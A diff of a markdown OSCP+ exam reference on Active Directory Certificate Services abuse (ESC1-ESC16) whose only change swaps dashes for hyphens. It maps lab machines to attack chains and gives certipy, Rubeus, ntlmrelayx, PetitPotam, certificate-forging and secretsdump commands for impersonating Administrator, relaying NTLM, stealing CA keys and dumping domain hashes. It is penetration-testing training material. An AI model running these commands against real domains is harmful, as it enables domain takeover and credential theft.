@@ -1,6 +1,6 @@
 # The definitive ADCS ESC1-ESC16 OSCP+ exam reference research
 
-This research compiles every piece of information needed to build the most comprehensive ADCS HTML reference tool: machine-by-machine attack chains across HTB/VulnLab/PGP/THM, complete ESC1–ESC16 technique details, all alternative tools per step, exhaustive failure-mode fixes, dynamic-variable architecture, post-exploitation paths, and the gotchas that separate exam passes from fails. The most critical theme: **certipy v5.0.2+ is required for ESC15/ESC16, `-sid` is now mandatory after the Feb 2025 strong-binding enforcement, and clock skew + UPN restoration kill more attempts than any other single issue.**
+This research compiles every piece of information needed to build the most comprehensive ADCS HTML reference tool: machine-by-machine attack chains across HTB/VulnLab/PGP/THM, complete ESC1-ESC16 technique details, all alternative tools per step, exhaustive failure-mode fixes, dynamic-variable architecture, post-exploitation paths, and the gotchas that separate exam passes from fails. The most critical theme: **certipy v5.0.2+ is required for ESC15/ESC16, `-sid` is now mandatory after the Feb 2025 strong-binding enforcement, and clock skew + UPN restoration kill more attempts than any other single issue.**
 
 ---
 
@@ -14,14 +14,14 @@ This research compiles every piece of information needed to build the most compr
 | **Manager** | Medium | ESC7 | `SubCA` (built-in) | `manager-DC01-CA` | Cleanup script resets every ~10min; `-add-officer` then `-enable-template SubCA` then deny→issue→retrieve cycle. Foothold: RID brute → `operator:operator` → MSSQL `xp_dirtree` → backup zip → `raven` |
 | **Certified** | Medium | ESC9 | `CertifiedAuthentication` | `certified-DC01-CA` | Multi-step ACL chain (judith→Management→management_svc→ca_operator). Set UPN to bare `Administrator` (NOT `@domain`) to avoid collision |
 | **EscapeTwo** | Easy | ESC4→ESC1 | `DunderMifflinAuthentication` | `sequel-DC01-CA` | Certipy v4 uses `-save-old`; v5 uses `-write-default-configuration -no-save`. Foothold: corrupted XLSX → MSSQL sa → `sql_svc` → `ryan` |
-| **Authority** | Medium | ESC1 (machine) | `CorpVPN` | `AUTHORITY-CA` | **PKINIT FAILS** (`KDC_ERR_PADATA_TYPE_NOSUPP`) — must use `certipy auth -ldap-shell` or PassTheCert.py. Domain Computers can enroll → MAQ=10, create machine acct |
+| **Authority** | Medium | ESC1 (machine) | `CorpVPN` | `AUTHORITY-CA` | **PKINIT FAILS** (`KDC_ERR_PADATA_TYPE_NOSUPP`) - must use `certipy auth -ldap-shell` or PassTheCert.py. Domain Computers can enroll → MAQ=10, create machine acct |
 | **Fluffy** | Easy | ESC16 | `User` (default!) | `fluffy-DC01-CA` | Security extension globally disabled (`DisableExtensionList` contains `1.3.6.1.4.1.311.25.2`). Use `faketime` for skew. Chain: CVE-2025-24071 .library-ms → p.agila → shadow ca_svc → ESC16 UPN flip |
-| **TombWatcher** | Medium | ESC15 | `WebServer` (V1) | `tombwatcher-CA-1` | Schema v1 + EKUwu CVE-2024-49019. Use `-application-policies 'Certificate Request Agent'` (Scenario B) chained to ESC3 — Scenario A often fails with `CA_MD_TOO_WEAK`. AD Recycle Bin recovery of `cert_admin` |
+| **TombWatcher** | Medium | ESC15 | `WebServer` (V1) | `tombwatcher-CA-1` | Schema v1 + EKUwu CVE-2024-49019. Use `-application-policies 'Certificate Request Agent'` (Scenario B) chained to ESC3 - Scenario A often fails with `CA_MD_TOO_WEAK`. AD Recycle Bin recovery of `cert_admin` |
 | **Certificate** | Hard | ESC3 + Golden Cert | `Delegated-CRA`+`SignedUser` | `Certificate-LTD-CA` | Admin not enrollable on SignedUser → pivot via `ryan.k` (Domain Storage Managers + SeManageVolumePrivilege) → exfil CA private key → `certipy forge` |
 | **Scepter** | Hard | ESC14 (A & B) | `StaffAccessCertificate`, `HelpdeskEnrollmentCertificate` | `scepter-DC01-CA` | NFS .pfx files (3 disabled, not revoked). Scenario B: modify victim `mail` to match weak X509RFC822 mapping; Scenario A: write target's `altSecurityIdentities` |
 | **Coder** | Insane | ESC4 (PowerShell) | `0xdf-ESC1` (custom) | `coder-DC01-CA` | Uses `New-ADCSTemplate` PS module to create custom ESC1 template; alternative path: CVE-2022-26923 with computer in custom OU |
 | **Search** | Hard | N/A (legitimate) | (web enrollment) | n/a | Client-cert auth for PSWA; import .pfx to Firefox; not an ESC vuln |
-| **Cascade** | Medium | None (LDAP) | n/a | n/a | `cascadeLegacyPwd` base64 attribute + AD Recycle Bin — NOT ADCS |
+| **Cascade** | Medium | None (LDAP) | n/a | n/a | `cascadeLegacyPwd` base64 attribute + AD Recycle Bin - NOT ADCS |
 
 ### VulnLab / HTB Dedicated Labs (verified ADCS)
 
@@ -35,31 +35,31 @@ This research compiles every piece of information needed to build the most compr
 | **Cicada/VulnCicada** | ESC8 | `DomainController` | Empty-target DNS trick + PetitPotam coerce, web enrollment relay |
 | **Shibuya/Senpai** | ESC1 | `ShibuyaWeb` | proxychains; `-key-size 4096 -sid S-1-...-500` required |
 
-### NOT-ADCS machines (commonly mislabeled — flag in tool)
+### NOT-ADCS machines (commonly mislabeled - flag in tool)
 
-- **VulnLab Trusted** — cross-forest trust + `raiseChild.py`, NOT ADCS
-- **VulnLab Tengu** — gMSA + constrained delegation + DPAPI
-- **VulnLab Baby2** — logon script + GPO/WriteDacl + pyGPOAbuse
-- **VulnLab Breach** — Silver Ticket (commonly confused with cert attacks)
-- **VulnLab Data / Lock / Reset** — Linux boxes, no AD at all
-- **VulnLab Manage** — no public writeups located
-- **PGP Nagoya** — Silver Ticket, dnSpy reverse-engineering
-- **PGP Access** — Kerberoast + SeManageVolumePrivilege
-- **PGP Resourced** — RBCD only
-- **PGP Hokkaido** — Targeted Kerberoast + SeBackupPrivilege
-- **THM Post-Exploitation Basics** — Mimikatz/Golden Ticket only
+- **VulnLab Trusted** - cross-forest trust + `raiseChild.py`, NOT ADCS
+- **VulnLab Tengu** - gMSA + constrained delegation + DPAPI
+- **VulnLab Baby2** - logon script + GPO/WriteDacl + pyGPOAbuse
+- **VulnLab Breach** - Silver Ticket (commonly confused with cert attacks)
+- **VulnLab Data / Lock / Reset** - Linux boxes, no AD at all
+- **VulnLab Manage** - no public writeups located
+- **PGP Nagoya** - Silver Ticket, dnSpy reverse-engineering
+- **PGP Access** - Kerberoast + SeManageVolumePrivilege
+- **PGP Resourced** - RBCD only
+- **PGP Hokkaido** - Targeted Kerberoast + SeBackupPrivilege
+- **THM Post-Exploitation Basics** - Mimikatz/Golden Ticket only
 
 ### TryHackMe (verified ADCS)
 
-- **AD Certificate Templates** room — single-VM lab, templates `User Request` + `HTTPSWebServer`, domain `lunar.eruca.com`
-- **CVE-2022-26923 (Certifried)** room — machine account + `dnsHostName` modification + Machine template
-- **Exploiting Active Directory** network — partial AD CS coverage
+- **AD Certificate Templates** room - single-VM lab, templates `User Request` + `HTTPSWebServer`, domain `lunar.eruca.com`
+- **CVE-2022-26923 (Certifried)** room - machine account + `dnsHostName` modification + Machine template
+- **Exploiting Active Directory** network - partial AD CS coverage
 
 ---
 
 ## 2. Detailed ESC1-ESC16 technique reference
 
-### ESC1 — Enrollee-supplied subject + client auth EKU
+### ESC1 - Enrollee-supplied subject + client auth EKU
 
 **Detection:** `Enrollee Supplies Subject : True` + `Client Authentication : True` + low-priv enrollee.
 
@@ -78,7 +78,7 @@ Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:Pass /ptt
 
 **Top failures:** clock skew → `faketime` or `ntpdate`; SID mismatch → `-sid`; PADATA error → `-ldap-shell`; LDAP CB → patched ldap3.
 
-### ESC2 — Any Purpose / no EKU
+### ESC2 - Any Purpose / no EKU
 
 Acts like an enrollment agent cert. Use it on-behalf-of admin against User v1 template:
 ```
@@ -86,7 +86,7 @@ certipy req -u U -p P -ca CA -template AnyPurpose                               
 certipy req -u U -p P -ca CA -template User -pfx U.pfx -on-behalf-of "DOM\\Admin" # impersonate
 ```
 
-### ESC3 — Certificate Request Agent EKU
+### ESC3 - Certificate Request Agent EKU
 
 Two-step on-behalf-of chain:
 ```
@@ -96,7 +96,7 @@ certipy auth -pfx administrator.pfx
 ```
 Target template must be Schema v1 (User, Machine, SmartcardUser) unless application-policy match.
 
-### ESC4 — Vulnerable template ACL
+### ESC4 - Vulnerable template ACL
 
 ```
 # v4: certipy template -u U -p P -dc-ip $DC -template VulnTpl -save-old
@@ -107,20 +107,20 @@ Target template must be Schema v1 (User, Machine, SmartcardUser) unless applicat
 
 Auto-applies: `ENROLLEE_SUPPLIES_SUBJECT`, Client Auth EKU, `Authenticated Users:FullControl`, `msPKI-RA-Signature=0`, removes `PEND_ALL_REQUESTS`. **Always restore.**
 
-### ESC5 — PKI AD object ACL (NTAuthCertificates, Cert Templates container, CA computer object)
+### ESC5 - PKI AD object ACL (NTAuthCertificates, Cert Templates container, CA computer object)
 
-Certipy doesn't detect — manual ACL audit. Path: child DA → SYSTEM on child DC → modify Configuration NC → publish rogue template OR write to NTAuthCertificates → trust rogue CA.
+Certipy doesn't detect - manual ACL audit. Path: child DA → SYSTEM on child DC → modify Configuration NC → publish rogue template OR write to NTAuthCertificates → trust rogue CA.
 
 ```
 certipy ca -backup -u admin -p P -ca CA -target $CA_HOST    # extract CA key
 certipy forge -ca-pfx CA.pfx -upn admin@dom -extensions sid:S-1-5-21-...-500
 ```
 
-### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
+### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
 
-CA registry flag honors arbitrary SAN. Mostly killed by KB5014754 — now must chain with **ESC9 or ESC16** for usable cert. Detection: `User Specified SAN : Enabled`.
+CA registry flag honors arbitrary SAN. Mostly killed by KB5014754 - now must chain with **ESC9 or ESC16** for usable cert. Detection: `User Specified SAN : Enabled`.
 
-### ESC7 — Vulnerable CA access control (ManageCA / ManageCertificates)
+### ESC7 - Vulnerable CA access control (ManageCA / ManageCertificates)
 
 Full SubCA chain (5 commands):
 ```
@@ -135,14 +135,14 @@ certipy auth -pfx administrator.pfx
 
 Alternative ESC7 paths (Certify v2): `coerceauth` (CDP manipulation), `writefile` (path traversal to `wwwroot`).
 
-### ESC8 — NTLM relay to AD CS web enrollment
+### ESC8 - NTLM relay to AD CS web enrollment
 
 ```
 # Terminal 1
 impacket-ntlmrelayx -t http://$CA_HOST/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
 # OR: certipy relay -target http://$CA_HOST -template DomainController
 
-# Terminal 2 — coerce
+# Terminal 2 - coerce
 python3 PetitPotam.py -u U -p P -d D $ATTACKER $DC_IP
 coercer coerce -l $ATTACKER -t $DC_IP -u U -p P -d D
 python3 dfscoerce.py -u U -p P -d D $ATTACKER $DC_IP
@@ -155,7 +155,7 @@ secretsdump.py -hashes :$DC_NT_HASH D/'DC$'@$DC_IP -just-dc
 
 For HTTPS: must have EPA disabled. For SMB listener: `systemctl stop smbd`; allow non-root 445: `echo 0 | sudo tee /proc/sys/net/ipv4/ip_unprivileged_port_start`.
 
-### ESC9 — CT_FLAG_NO_SECURITY_EXTENSION on template
+### ESC9 - CT_FLAG_NO_SECURITY_EXTENSION on template
 
 Five-command UPN-flip pattern:
 ```
@@ -168,12 +168,12 @@ certipy auth -pfx administrator.pfx -domain D -dc-ip $DC -username administrator
 
 UPN value: bare `administrator` (NOT `@domain`) to avoid collision with the real Administrator's UPN.
 
-### ESC10 — Weak certificate mappings via registry
+### ESC10 - Weak certificate mappings via registry
 
 - **Case 1 (Kerberos, SBE=0):** identical exploit to ESC9 but ANY client-auth template works
 - **Case 2 (Schannel, CertificateMappingMethods has UPN bit 0x4):** only NULL-UPN accounts (machine accts, default Administrator); MUST use `-ldap-shell` (Schannel only)
 
-### ESC11 — Relay to ICPR (RPC), IF_ENFORCEENCRYPTICERTREQUEST disabled
+### ESC11 - Relay to ICPR (RPC), IF_ENFORCEENCRYPTICERTREQUEST disabled
 
 ```
 # Certipy v4.7+
@@ -185,7 +185,7 @@ sudo ntlmrelayx.py -t rpc://$CA_IP -rpc-mode ICPR -icpr-ca-name $CA_NAME -smb2su
 # Coerce as ESC8
 ```
 
-### ESC12 — Shell access on CA / YubiHSM key extraction → Golden Cert
+### ESC12 - Shell access on CA / YubiHSM key extraction → Golden Cert
 
 ```
 certipy ca -backup -u admin -p P -ca CA -target $CA_HOST    # admin on CA needed
@@ -195,7 +195,7 @@ certipy auth -pfx administrator_forged.pfx -dc-ip $DC
 
 YubiHSM-specific: `reg query HKLM\SOFTWARE\Yubico\YubiHSM /v AuthKeysetPassword` then use CSP from any process on CA.
 
-### ESC13 — Issuance Policy with msDS-OIDToGroupLink
+### ESC13 - Issuance Policy with msDS-OIDToGroupLink
 
 Cert auth puts user into linked AD group's PAC during the session. Detection requires Certipy ≥4.8.2. Linked group must be Universal scope, ideally empty.
 ```
@@ -204,7 +204,7 @@ certipy auth -pfx U.pfx -dc-ip $DC -domain D
 # TGT contains linked group membership
 ```
 
-### ESC14 — altSecurityIdentities abuse (4 scenarios)
+### ESC14 - altSecurityIdentities abuse (4 scenarios)
 
 - **A:** Write strong mapping (`X509:<I>...<SR>...`) to target's `altSecurityIdentities` pointing to attacker cert
 - **B:** Target has weak `X509:<RFC822>email` mapping → set victim's `mail` to match
@@ -220,7 +220,7 @@ certipy auth -pfx victim.pfx -username $TARGET -domain D
 
 Strong-mapping serial number: REVERSE byte order, hex uppercase, no separators.
 
-### ESC15 — EKUwu (CVE-2024-49019)
+### ESC15 - EKUwu (CVE-2024-49019)
 
 Schema v1 templates allow injecting arbitrary application policy OIDs in CSR. Detection: `Schema Version : 1` + `Enrollee Supplies Subject : True`.
 
@@ -230,7 +230,7 @@ certipy req -u U -p P -dc-ip $DC -target $CA -ca CA -template WebServer \
     -upn admin@D -application-policies 'Client Authentication'
 ```
 
-**Path B (chain to ESC3 — preferred, more reliable):**
+**Path B (chain to ESC3 - preferred, more reliable):**
 ```
 certipy req ... -template WebServer -application-policies "1.3.6.1.4.1.311.20.2.1"   # CRA
 certipy req ... -template User -pfx U.pfx -on-behalf-of "D\\Administrator"
@@ -239,7 +239,7 @@ certipy auth -pfx administrator.pfx
 
 Patched Nov 12, 2024 (KB5046612 family). Requires Certipy ≥5.0.
 
-### ESC16 — Security extension globally disabled on CA
+### ESC16 - Security extension globally disabled on CA
 
 CA registry: `DisableExtensionList` contains `1.3.6.1.4.1.311.25.2`. ALL certs from this CA lack SID extension → ESC9-style abuse on ANY client-auth template. **HTB Fluffy reference.** Requires Certipy ≥5.0.2.
 
@@ -316,7 +316,7 @@ faketime '<DC time>' certipy auth -pfx administrator.pfx -username administrator
 - `Certify.exe request /onbehalfof:DOM\admin /enrollcert:agent.pfx /enrollcertpw:''`
 
 ### ESC4 template modification
-- **Certipy:** `template -save-old` (v4) / `-write-default-configuration` (v5) — auto applies all needed flags
+- **Certipy:** `template -save-old` (v4) / `-write-default-configuration` (v5) - auto applies all needed flags
 - **PowerView:** `Set-DomainObject -XOR @{'mspki-certificate-name-flag'=1}` etc.
 - **bloodyAD:** `set object 'CN=Tpl,...' msPKI-Certificate-Name-Flag -v 1`
 - **StandIn:** `--adcs --filter Tpl --ess --add` / `--clientauth --add` / `--pend --remove`
@@ -352,7 +352,7 @@ faketime '<DC time>' certipy auth -pfx administrator.pfx -username administrator
 
 ### Cert authentication (PFX → TGT/NThash)
 - `certipy auth -pfx admin.pfx` (primary; UnPAC-the-hash automatic)
-- `gettgtpkinit.py + getnthash.py` (PKINITtools — granular)
+- `gettgtpkinit.py + getnthash.py` (PKINITtools - granular)
 - `Rubeus asktgt /certificate /getcredentials /nowrap` (Windows)
 - `kinit -X X509_user_identity=FILE:admin.pem` (with /etc/krb5.conf)
 - Mimikatz: `kerberos::ptt admin.kirbi`
@@ -450,10 +450,10 @@ If `certipy find` fails (LDAP issues, timeouts, missing ESC16 detection):
 ## 7. Tips & attention points (the gotchas that fail exam attempts)
 
 ### Cleanup obligations (mandatory)
-1. **ESC4 template** — always `-save-old` on entry, `-configuration X.json` to restore. Leaving overwritten = permanent backdoor + IoC.
-2. **ESC9/10/16 UPN** — always restore victim's `userPrincipalName` to original (`victim@domain.local`). Failure breaks logons + lockouts.
-3. **ESC7 added officer** — `certipy ca -remove-officer` after.
-4. **Computer accounts created** (Certifried/MAQ) — `certipy account delete -user BADPC`.
+1. **ESC4 template** - always `-save-old` on entry, `-configuration X.json` to restore. Leaving overwritten = permanent backdoor + IoC.
+2. **ESC9/10/16 UPN** - always restore victim's `userPrincipalName` to original (`victim@domain.local`). Failure breaks logons + lockouts.
+3. **ESC7 added officer** - `certipy ca -remove-officer` after.
+4. **Computer accounts created** (Certifried/MAQ) - `certipy account delete -user BADPC`.
 
 ### Critical syntax pitfalls
 5. **`-ca` value:** Certipy = name only (`corp-DC-CA`); Certify = `HOST\NAME` (`DC01.corp.local\corp-DC-CA`).
@@ -465,7 +465,7 @@ If `certipy find` fails (LDAP issues, timeouts, missing ESC16 detection):
 11. **UPN flip uses bare username:** `-upn administrator` (not `administrator@domain`) to avoid collision.
 
 ### Auth/network failures
-12. **Clock skew (#1 silent killer):** `sudo ntpdate -u $DC` (kills VPN — reconnect) OR `faketime "$(ntpdate -q $DC | cut -d' ' -f1,2)" certipy ...`
+12. **Clock skew (#1 silent killer):** `sudo ntpdate -u $DC` (kills VPN - reconnect) OR `faketime "$(ntpdate -q $DC | cut -d' ' -f1,2)" certipy ...`
 13. **Strong Binding (default Feb 2025):** `KDC_ERR_CERTIFICATE_MISMATCH` / `Object SID mismatch` → always include `-sid S-1-5-21-...-500` on `certipy req`. Get target SID from `certipy account read` or `nxc ldap`.
 14. **PKINIT fail (`KDC_ERR_PADATA_TYPE_NOSUPP`):** DC has no Smart Card EKU cert. Use `certipy auth -pfx admin.pfx -ldap-shell -ldap-scheme ldaps` (Schannel) or PassTheCert.py.
 15. **Kerberos requires FQDN:** `-k -no-pass admin@DC.corp.local` (NOT IP). Use `KRB5_TRACE=/dev/stderr` for debugging.
@@ -480,7 +480,7 @@ If `certipy find` fails (LDAP issues, timeouts, missing ESC16 detection):
 22. **Certify NullReferenceException** on non-domain-joined Windows: get TGT via Rubeus first OR fall back to Certipy on Linux.
 23. **Rubeus CSP error:** re-export PFX with `-CSP "Microsoft Enhanced Cryptographic Provider v1.0"`.
 24. **OpenSSL legacy provider:** `openssl pkcs12 -in old.pfx -nodes -legacy` for old Windows PFX (RC2-40-CBC).
-25. **Certipy 5.0.3 bug:** misreports clock skew as `KDC_ERROR_CLIENT_NOT_TRUSTED` — always check skew first.
+25. **Certipy 5.0.3 bug:** misreports clock skew as `KDC_ERROR_CLIENT_NOT_TRUSTED` - always check skew first.
 
 ### Format conversions
 26. **PFX → CRT+KEY** for evil-winrm/PassTheCert/openssl: `certipy cert -pfx admin.pfx -nokey -out admin.crt; -nocert -out admin.key`
@@ -490,14 +490,14 @@ If `certipy find` fails (LDAP issues, timeouts, missing ESC16 detection):
 ### Operational
 29. **Coercion targets:** must be machine accounts (DC$, FILE01$), not users. Set up listener (`responder -I tun0 -A` or `ntlmrelayx`) BEFORE coercing.
 30. **Free local ports for relay:** `systemctl stop apache2 smbd` and `echo 0 | sudo tee /proc/sys/net/ipv4/ip_unprivileged_port_start` (445).
-31. **HTB cleanup scripts** (Manager, Scepter, Fluffy) reset every 5-15 min — script the full chain or be fast.
+31. **HTB cleanup scripts** (Manager, Scepter, Fluffy) reset every 5-15 min - script the full chain or be fast.
 32. **Don't leak PFX:** valid until cert expires/revoked, even after password change. Persists across credential rotation.
-33. **Safe vs admin templates:** `User`/`Machine`/`WebServer` — broad enroll; `DomainController`/`KerberosAuthentication`/`SubCA` — admin-only (only via ESC7 SubCA chain or ESC8 machine relay).
-34. **Save private key on ESC7 deny:** answer "y" when `certipy req` produces `CERTSRV_E_TEMPLATE_DENIED` — the `<id>.key` file is required for `-retrieve <id>` later.
+33. **Safe vs admin templates:** `User`/`Machine`/`WebServer` - broad enroll; `DomainController`/`KerberosAuthentication`/`SubCA` - admin-only (only via ESC7 SubCA chain or ESC8 machine relay).
+34. **Save private key on ESC7 deny:** answer "y" when `certipy req` produces `CERTSRV_E_TEMPLATE_DENIED` - the `<id>.key` file is required for `-retrieve <id>` later.
 
 ### Detection-evasion specific to OSCP+
 35. Always restore template/UPN/officer/computer-account artifacts before exam screenshot for "demonstration of post-exploit cleanup" bonus.
-36. Use `-debug` with Certipy to see exactly which step fails — most TA feedback comes from this output.
+36. Use `-debug` with Certipy to see exactly which step fails - most TA feedback comes from this output.
 37. Per-ESC certipy version requirements: ESC13 ≥4.8.2; ESC15 ≥5.0; ESC16 ≥5.0.2. Memorize this table.
 
 ---
@@ -506,4 +506,4 @@ If `certipy find` fails (LDAP issues, timeouts, missing ESC16 detection):
 
 The data above maps cleanly into a tool with three layers: a top-bar variable panel (24 vars across network/CA/credential/per-attack categories) that auto-substitutes via JavaScript template literals into every command; sixteen ESC sections (ESC1-ESC16) each containing detection→exploit (Linux+Windows)→top-3 failures→alternatives→post-exploit; and a per-machine reference panel (~25 lab boxes) with exact attack chains keyed to ESC sections.
 
-The decisive insight from this research: **Certipy v5.0.2+ with `-sid` is the new baseline.** Every command emitted by the tool should default to including the SID extension, since the Feb 2025 Strong Binding enforcement makes it mandatory in nearly every modern environment. The ESC9/ESC10/ESC16 UPN-flip patterns also share an identical 5-command structure (read → update → req → restore → auth), which the tool should expose as a reusable component to prevent the most common student mistake — forgetting to restore the victim's UPN. Finally, the failure-mode taxonomy (clock skew → SID mismatch → PKINIT support → LDAP binding → key length) should appear as a persistent troubleshooting sidebar on every ESC page, since these five issues account for over 90% of failed exploit attempts in the writeups surveyed.
+The decisive insight from this research: **Certipy v5.0.2+ with `-sid` is the new baseline.** Every command emitted by the tool should default to including the SID extension, since the Feb 2025 Strong Binding enforcement makes it mandatory in nearly every modern environment. The ESC9/ESC10/ESC16 UPN-flip patterns also share an identical 5-command structure (read → update → req → restore → auth), which the tool should expose as a reusable component to prevent the most common student mistake - forgetting to restore the victim's UPN. Finally, the failure-mode taxonomy (clock skew → SID mismatch → PKINIT support → LDAP binding → key length) should appear as a persistent troubleshooting sidebar on every ESC page, since these five issues account for over 90% of failed exploit attempts in the writeups surveyed.
